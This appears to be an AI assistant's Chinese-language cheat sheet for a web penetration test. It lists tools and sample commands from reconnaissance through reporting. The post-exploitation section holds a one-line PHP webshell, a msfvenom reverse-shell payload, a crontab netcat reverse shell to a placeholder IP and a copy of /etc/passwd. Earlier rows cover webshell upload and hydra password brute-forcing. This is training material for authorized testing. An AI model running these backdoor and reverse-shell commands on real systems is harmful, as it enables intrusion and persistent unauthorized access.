好的，给你一套**Web渗透测试标准流程**的工具使用顺序，从信息收集到权限维持，覆盖完整的渗透测试生命周期。

---

## 📋 Web渗透测试标准流程（5个阶段）

```
信息收集 → 漏洞发现 → 漏洞利用 → 后渗透 → 报告输出
```

---

## 🔍 **阶段一：信息收集（侦察）**

**目标：** 尽可能多地了解目标，不触发告警。

### 1.1 被动信息收集（不接触目标）

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **whois** | 域名注册信息 | `whois target.com` |
| **nslookup/dig** | DNS 解析 | `nslookup target.com` |
| **dnsrecon** | DNS 枚举 | `dnsrecon -d target.com -t axfr,goo,ns` |
| **sublist3r** | 子域名收集 | `sublist3r -d target.com -o subdomains.txt` |
| **amass** | 子域名收集（被动） | `amass enum -passive -d target.com` |
| **theHarvester** | 邮箱/域名收集 | `theHarvester -d target.com -b google` |
| **shodan** | 网络设备/服务搜索 | `shodan search target.com` |

### 1.2 主动信息收集（轻触目标）

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **whatweb** | Web 指纹识别 | `whatweb https://target.com` |
| **nmap** | 端口扫描 | `nmap -sV -p- --min-rate 1000 target.com` |
| **curl** | 查看响应头/敏感文件 | `curl -k -I https://target.com/robots.txt` |
| **gobuster**（DNS模式） | 子域名爆破 | `gobuster dns -d target.com -w subdomains.txt` |
| **wfuzz**（轻量） | 目录/参数探测 | `wfuzz -z file,/path/wordlist https://target.com/FUZZ` |

---

## 🎯 **阶段二：漏洞发现（扫描与枚举）**

**目标：** 全面扫描，发现潜在的漏洞点。

### 2.1 Web 应用扫描

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **nikto** | 通用 Web 扫描器 | `nikto -h https://target.com -ssl` |
| **WPScan** | WordPress 专用扫描 | `wpscan --url https://target.com/wordpress --enumerate u,vp,vt` |
| **droopescan** | CMS 专用扫描（支持多种） | `droopescan scan drupal -u https://target.com` |
| **nuclei** | 基于模板的漏洞扫描 | `nuclei -u https://target.com -t cves/` |
| **skipfish** | 自动化 Web 安全扫描 | `skipfish -o report -S /usr/share/skipfish/dictionaries/complete.wl https://target.com` |

### 2.2 目录爆破

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **ffuf** | 目录/参数爆破（首选） | `ffuf -u https://target.com/FUZZ -w /path/wordlist -mc 200,301,302,403` |
| **gobuster** | 目录/文件爆破 | `gobuster dir -u https://target.com -w /path/wordlist -x php,html,txt` |
| **dirb** | 经典目录扫描 | `dirb https://target.com /usr/share/wordlists/dirb/common.txt` |
| **dirsearch** | 专业目录扫描 | `dirsearch -u https://target.com -e php,html,txt` |

### 2.3 参数发现

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **ffuf**（参数爆破） | GET/POST 参数发现 | `ffuf -u https://target.com/page?FUZZ=test -w params.txt` |
| **Arjun** | HTTP 参数发现 | `arjun -u https://target.com/page` |
| **ParamSpider** | 参数挖掘 | `paramspider -d target.com` |

### 2.4 漏洞扫描

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **sqlmap** | SQL 注入检测 | `sqlmap -u "https://target.com/page?id=1" --batch` |
| **XSStrike** | XSS 检测 | `python3 xsstrike.py -u "https://target.com/page?q=test"` |
| **OpenVAS** | 完整漏洞扫描 | `openvas -t target.com` |
| **wpscan**（漏洞检测） | WordPress 插件/主题漏洞 | `wpscan --url https://target.com --enumerate vp,vt --api-token YOUR_TOKEN` |

---

## 🚀 **阶段三：漏洞利用**

**目标：** 利用发现的漏洞获取权限或敏感信息。

### 3.1 自动化利用

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **Metasploit** | 漏洞利用框架 | `msfconsole` → `search` → `use exploit/...` → `run` |
| **searchsploit** | 查找 EXP | `searchsploit wordpress 6.0.13` |
| **BeEF** | 浏览器攻击框架 | `beef-xss` |

### 3.2 手动利用

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **curl** | 手动发送请求 | `curl -k -X POST https://target.com/upload -F "file=@shell.php"` |
| **burp suite** | 拦截/修改请求 | 图形化工具 |
| **hydra** | 密码爆破 | `hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` |

### 3.3 漏洞复现

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **sqlmap**（利用） | 获取数据库数据 | `sqlmap -u "https://target.com/page?id=1" --dump --batch` |
| **weevely** | PHP webshell 管理 | `weevely generate password shell.php` |

---

## 🔐 **阶段四：后渗透（权限维持与横向移动）**

**目标：** 巩固已获得的权限，扩大控制范围。

### 4.1 权限维持

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **msfvenom** | 生成 Payload | `msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.php` |
| **webshell**（手动） | 上传后门 | `echo '<?php system($_GET["cmd"]); ?>' > shell.php` |
| **crontab**（Linux） | 定时任务维持权限 | `echo "* * * * * /bin/bash -c 'nc -e /bin/bash IP PORT'" >> /etc/crontab` |

### 4.2 内网渗透

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **nmap**（内网扫描） | 内网主机发现 | `nmap -sn 192.168.1.0/24` |
| **proxychains** | 代理穿透 | `proxychains nmap -sT -Pn 192.168.1.1` |
| **chisel** | 隧道代理 | `chisel server --socks5` / `chisel client` |
| **BloodHound** | AD 域信息收集 | 图形化分析工具 |

### 4.3 数据收集

| 工具 | 用途 | 命令示例 |
|:---|:---|:---|
| **mysql** | 数据库连接 | `mysql -u root -p -h target.com` |
| **psql** | PostgreSQL 连接 | `psql -h target.com -U postgres` |
| **scp** | 文件传输 | `scp user@target.com:/etc/passwd ./` |

---

## 📄 **阶段五：报告输出**

**目标：** 整理发现和利用过程，输出专业报告。

| 工具 | 用途 |
|:---|:---|
| **Nessus**（扫描报告） | 生成漏洞扫描报告 |
| **wpscan**（输出 JSON） | `wpscan --url https://target.com --output wpscan_report.json` |
| **ffuf**（输出 JSON/HTML） | `ffuf -u https://target.com/FUZZ -w wordlist.txt -o result.json -of json` |
| **sqlmap**（输出） | `sqlmap -u "https://target.com/page?id=1" --batch --output-dir=./reports/` |
| **Markdown/Word** | 手动整理最终报告 |

---

## 📋 完整流程图

```
┌─────────────────────────────────────────────────────────────┐
│                    第1阶段：信息收集                        │
├─────────────────────────────────────────────────────────────┤
│ whois → nslookup → sublist3r → theHarvester → whatweb    │
│                             ↓                             │
├─────────────────────────────────────────────────────────────┤
│                    第2阶段：漏洞发现                        │
├─────────────────────────────────────────────────────────────┤
│ nmap → dirb/ffuf → nikto → wpscan → nuclei               │
│                             ↓                             │
├─────────────────────────────────────────────────────────────┤
│                    第3阶段：漏洞利用                        │
├─────────────────────────────────────────────────────────────┤
│ searchsploit → Metasploit → sqlmap → hydra               │
│                             ↓                             │
├─────────────────────────────────────────────────────────────┤
│                    第4阶段：后渗透                         │
├─────────────────────────────────────────────────────────────┤
│ webshell → msfvenom → proxychains → BloodHound           │
│                             ↓                             │
├─────────────────────────────────────────────────────────────┤
│                    第5阶段：报告输出                       │
├─────────────────────────────────────────────────────────────┤
│ wpscan/ffuf/sqlmap 输出 → 手动整理 → 提交报告             │
└─────────────────────────────────────────────────────────────┘
```

---

## ⚠️ 重要原则

| 原则 | 说明 |
|:---|:---|
| **从被动到主动** | 先做不接触目标的收集，再做主动扫描 |
| **从低频到高频** | 控制扫描速度，避免触发 WAF/IPS |
| **从通用到专用** | 先用通用工具（whatweb），再用专用工具（wpscan） |
| **记录每一步** | 保存所有扫描输出，便于报告和复盘 |
| **合法授权** | 没有授权时，**不要进行第3-5阶段的操作** |
